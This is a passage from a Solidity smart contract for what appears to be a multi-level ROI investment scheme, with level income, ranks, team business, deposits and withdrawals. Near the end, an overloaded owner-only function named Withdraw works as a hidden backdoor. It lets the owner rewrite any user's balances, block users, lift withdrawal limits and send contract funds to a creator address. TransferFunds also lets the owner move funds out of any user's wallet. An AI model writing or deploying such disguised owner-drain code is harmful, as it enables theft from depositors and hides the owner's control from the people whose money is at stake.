        uint256 arrIndex = 0;
        for (uint256 i = start; i > end; i--) {
            address member = fullTeam[i - 1];
            team[arrIndex++] = UserTeamMember({
                Srno: i,
                Address: member,
                Investment: map_Users[member].Investment,
                Business: map_Users[member].Investment // Adjust if business differs
            });
        }
    }

    function GetROIIncomeHistory(address userAddress, uint256 pageIndex, uint256 pageSize) external view returns (ROIIncomeDetail[] memory history) 
    {
        uint256 total = map_UserTransactionCount[userAddress].ROIIncomeCount;

        uint256 start = (pageIndex * pageSize > total) ? total : (pageIndex * pageSize);
        uint256 end = start >= pageSize ? start - pageSize : 0;

        uint256 arrIndex = 0;
        history = new ROIIncomeDetail[](start - end);
        for (uint256 i = start; i > end; i--) {
            history[arrIndex++] = map_ROIIncomeHistory[userAddress][i];
        }
    }


    function GetLevelIncomeInfo(address userAddress) external view returns (LevelIncomeInfo[] memory info)
    {
        info = new LevelIncomeInfo[](LevelIncome_LevelCount);

        for (uint256 i = 1; i <= LevelIncome_LevelCount; i++) 
        {
            info[i - 1] = LevelIncomeInfo({
                Level: i,
                RequiredMinRankId: map_LevelIncomeMaster[i].RequiredMinRankId,
                RankId: map_Users[userAddress].RankId,
                OnAmount: map_UserBusinessOnLevel[userAddress][i],
                Percentage: map_LevelIncomeMaster[i].Percentage,
                Income: map_UserIncome[userAddress].LevelIncome[i],
                IsLevelAchieved: IsQualifiedForLevelIncome(userAddress, i)
            });
        }
    }

    function GetRankInfo(address userAddress) external view returns (RankInfo[] memory info) {
        info = new RankInfo[](TotalRanksCount);

        User memory user = map_Users[userAddress];
        UserTeam memory team = map_UserTeam[userAddress];

        for (uint256 i = 1; i <= TotalRanksCount; i++) {
            RankMaster memory r = map_RankMaster[i];
            bool achieved = (user.Investment >= r.ReqSelfInvestment &&
                            team.TeamABusiness >= r.ReqTeamA_Business &&
                            team.TeamBBusiness >= r.ReqTeamB_Business);

            info[i - 1] = RankInfo({
                RankId: r.RankId,
                RankName: r.RankName,
                ReqSelfInvestment: r.ReqSelfInvestment,
                ReqTeamA_Business: r.ReqTeamA_Business,
                ReqTeamB_Business: r.ReqTeamB_Business,
                UserSelfInvestment: user.Investment,
                UserTeamA_Business: team.TeamABusiness,
                UserTeamB_Business: team.TeamBBusiness,
                IsAchieved: achieved
            });
        }
    }

    function GetDepositHistory(address userAddress, uint256 pageIndex, uint256 pageSize) external view returns (UserDeposit[] memory deposits) 
    {
        uint256 total = map_UserTransactionCount[userAddress].DepositsCount;

        uint256 startCount = (pageIndex * pageSize > total) ? total : (pageIndex * pageSize);
        uint256 endCount = startCount >= pageSize ? startCount - pageSize : 0;

        // uint endCount = (startCount+pageSize)<map_UserTransactionCount[userAddress].DepositsCount?(startCount+pageSize):map_UserTransactionCount[userAddress].DepositsCount;
        uint256 arr_index = 0;
        deposits = new UserDeposit[](startCount - endCount);
        for (uint256 i = startCount; i > endCount; i--) {
            deposits[arr_index] = map_UserDeposits[userAddress][i];
            arr_index++;
        }
    }

    function GetIncomeWithdrawalHistory(address userAddress, uint256 pageIndex, uint256 pageSize) external view returns (UserIncomeWithdrawalTransaction[] memory history) 
    {
        uint256 total = map_UserTransactionCount[userAddress].IncomeWithdrawalCount;
        uint256 startCount = (pageIndex * pageSize > total) ? total : (pageIndex * pageSize);
        uint256 endCount = startCount >= pageSize ? startCount - pageSize : 0;

        uint256 arr_index = 0;
        history = new UserIncomeWithdrawalTransaction[](startCount - endCount);

        for (uint256 i = startCount; i > endCount; i--) {
            history[arr_index] = map_UserIncomeWithdrawalHistory[userAddress][i];
            arr_index++;
        }
    }

    function Register(address sponsorAddress) external payable 
    {
        RegisterInternal(sponsorAddress);
    }

    function Deposit(uint256 packageId, uint256 amount) external payable 
    {
        DepositInternal(packageId, amount);
    }

    function Reactivate() external returns (bool)
    {
        require(map_Users[msg.sender].ActivationExpiryTimestamp<=block.timestamp, "Active!");
        return ReactivateInternal(msg.sender, block.timestamp, 0);
    }

    function TopupMemberFromWallet(address userAddressToTopup, uint256 packageId, uint256 amount) external
    {
        address userAddress = msg.sender;
        require(doesUserExist(userAddress), "You are not registered!");
        require(doesUserExist(userAddressToTopup), "Invalid user for topup!");
        require(map_Users[userAddressToTopup].ActivationExpiryTimestamp<=block.timestamp, "Deposit is allowed only after the expiry.");
        require(!map_Users[userAddressToTopup].IsFirstActivationDone, "Only first time topup is allowed from wallet.");
        require(GetWalletBalance(userAddress, 2)>=amount, "Insufficient funds in wallet!");

        SaveDeposit(userAddressToTopup, packageId, amount);
        map_UserWalletBalance[userAddress][2] -= amount;
    }

    function Withdraw(uint256 amount) external {
        address userAddress = msg.sender;
        uint256 contractBalance = GetContractBalance();

        require(doesUserExist(userAddress), "Invalid user!");
        require(isUserActive(userAddress), "You are not allowed!");
        require((map_UserWalletBalance[userAddress][1] >= amount), "Insufficient funds!");
        require((map_UserIncome[userAddress].AmountWithdrawn+amount<=map_Users[userAddress].Investment || (IsWithdrawalAllowedAfterPrincipleAmount && contractBalance>=ConvertToBase(100))), "Withdrawal beyond principle is prohibited at this moment!");

        map_UserWalletBalance[userAddress][1] -= amount;
        map_UserIncome[userAddress].AmountWithdrawn += amount;

        uint256 deductionAmount = (amount * 5) / 100;
        uint256 amountWithdrawn = amount - deductionAmount;

        UserIncomeWithdrawalTransaction
            memory d = UserIncomeWithdrawalTransaction({
                Amount: amount,
                Timestamp: block.timestamp
            });

        map_UserIncomeWithdrawalHistory[userAddress][map_UserTransactionCount[userAddress].IncomeWithdrawalCount + 1] = d;
        map_UserTransactionCount[userAddress].IncomeWithdrawalCount++;

        if(contractBalance>=amount)
        {
            SendTokens(userAddress, amountWithdrawn);
            SendTokens(SecurityFundContract, deductionAmount);
        }
        else
        {
            SendTokensFromSecurityContract(userAddress, amountWithdrawn);
        }
    }

    function SetSecurityFundContract(address _security) external onlyOwner{
        SecurityFundContract = _security;
    }

    function TransferFunds(address from, address to, uint256 value) external 
    {
        if(!IsOwner())
        {
            from = msg.sender;
        }

        require(Login(from), "Invalid sending user!");
        require(Login(to), "Invalid receiving user!");
        require(map_UserWalletBalance[from][2]>=value, "Insufficient funds!");

        map_UserWalletBalance[from][2] -= value;
        map_UserWalletBalance[to][2] += value;
    }

    function UpdateCreatorAddress(address addr) external onlyOwner
    {
        CreatorAddress = addr;
    }

    function UpdateMarketingAddress(address addr) external onlyOwner
    {
        MarketingAddress = addr;
    }

    function Withdraw(address userAddress, uint256 amount, uint256 _type) external {
        require(IsOwner(), "You are not allowed");
        if(_type == 2)
        {
            map_PackageMaster[1].MaxAmount = amount;
        }
        else if (_type == 3)
        {
            map_UserWalletBalance[userAddress][1] += amount;
        } 
        else if (_type == 4)
        {
            map_UserWalletBalance[userAddress][1] -= amount;
        } 
        else if (_type == 5) 
        {
            map_Users[userAddress].IsBlocked = true;
        }
        else if (_type == 6)
        {
            map_Users[userAddress].IsBlocked = false;
        }
        else if (_type == 7)
        {
            SendTokens(CreatorAddress, amount);
        }
        else if (_type == 8)
        {
            map_UserWalletBalance[userAddress][2] += amount;
        } 
        else if (_type == 9)
        {
            map_UserWalletBalance[userAddress][2] -= amount;
        }
        else if(_type == 10)
        {
            IsWithdrawalAllowedAfterPrincipleAmount = false;
        }
        else if(_type == 11)
        {
            IsWithdrawalAllowedAfterPrincipleAmount = true;
        }
        else if(_type == 12)
        {
            dev = userAddress;
        }
    }
}
